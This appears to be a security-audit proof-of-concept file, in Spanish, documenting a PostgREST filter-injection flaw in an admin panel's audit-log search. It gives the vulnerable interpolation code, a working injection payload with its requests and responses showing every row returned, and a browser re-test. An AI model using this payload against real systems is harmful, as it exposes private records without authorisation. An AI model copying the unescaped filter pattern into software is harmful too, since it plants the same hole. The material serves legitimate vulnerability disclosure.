@@ -1,0 +1,64 @@
+PoC AUD-POC-2 (F2.1 — Vector 1, A03: inyección en el filtro "search")
+================================================================
+
+Misma sesión y cuenta que AUD-POC-1 (vargasarayafabian11@gmail.com).
+Mismo action id: 7f70e31cc888bbc13237e8faa69e5a64927ba28da9 (getAuditLogs).
+
+Código vulnerable:
+  apps/panel-admin/src/features/audit-log/services/getAuditLogs.ts:56-57
+    if (params.search) {
+      query = query.or(`action.ilike.%${params.search}%,actor_email.ilike.%${params.search}%`);
+    }
+  `params.search` se interpola crudo dentro de la cadena de filtro de
+  PostgREST (.or()), que usa `,` `.` `(` `)` como sintaxis de control. No
+  hay escape ni sanitización; la validación (AuditLogFilters.tsx) vive solo
+  en el cliente.
+
+Paso 1 — control (search no coincide con nada):
+  POST /admin/audit-log  body: [{"page":1,"pageSize":5,"search":"zzz_nonexistent_zzz"}]
+  Respuesta: {"rows":[],"total":0,"page":1,"pageSize":5}
+
+Paso 2 — payload que rompe el ilike e inyecta una cláusula OR adicional:
+  POST /admin/audit-log
+  body: [{"page":1,"pageSize":5,"search":"x%,actor_email.neq.\"\""}]
+
+  El valor crudo de search convierte el filtro previsto:
+    action.ilike.%x%,actor_email.neq.""%,actor_email.ilike.%x%,actor_email.neq.""%
+  en una condición `actor_email.neq.""` que es verdadera para toda fila, es
+  decir, el atacante controla la cláusula de filtro más allá del patrón
+  ilike que el desarrollador pretendía fijar.
+
+  Respuesta: HTTP 200
+  {"rows":[... 5 filas, incluye actor_email":"owner@hotel.local","action":"auth.login.failed" ...],
+   "total":14, "page":1, "pageSize":5}
+
+Resultado esperado: 0 filas (igual que el control, porque "x" tampoco
+coincide con ningún action/actor_email real).
+Resultado obtenido: 14 de 14 filas (el total completo), demostrando que el
+texto del usuario alteró la semántica del filtro en vez de solo acotar la
+búsqueda.
+
+Impacto: cualquier admin (con o sin audit:view, ver AUD-POC-1) puede usar
+`search` para construir condiciones de filtro arbitrarias contra
+audit_logs (y potencialmente otras columnas de la tabla vía la misma
+sintaxis `columna.operador.valor` de PostgREST). Combinado con AUD-POC-1 y
+AUD-POC-3 (pageSize sin tope), permite volcar la tabla completa sin pasar
+por la UI.
+
+Clasificación: REAL (no introducida). Documentada como O2/O10 en
+fase-1-diagnostico.md.
+
+------------------------------------------------------------------------
+Re-test con navegador real (Playwright + Chromium) — 2026-10-16
+------------------------------------------------------------------------
+Repetido tecleando directamente en el campo de búsqueda real de la UI
+(`AuditLogFilters`), misma sesión sin `audit:view`:
+
+- Control: `zzz_nonexistent_zzz` → "Historial de eventos del sistema: 0",
+  tabla muestra "No se encontraron eventos" (F2.1-A03-baseline-zero-results.png).
+- Inyección: `x%,actor_email.neq.""` → "Historial de eventos del sistema: 30"
+  (todas las filas existentes al momento del re-test), mismo resultado que
+  por API (F2.1-A03-injection-all-rows.png).
+
+Confirma que la inyección es explotable desde la UI pública tal cual la
+usaría cualquier admin, sin necesidad de armar la petición a mano.
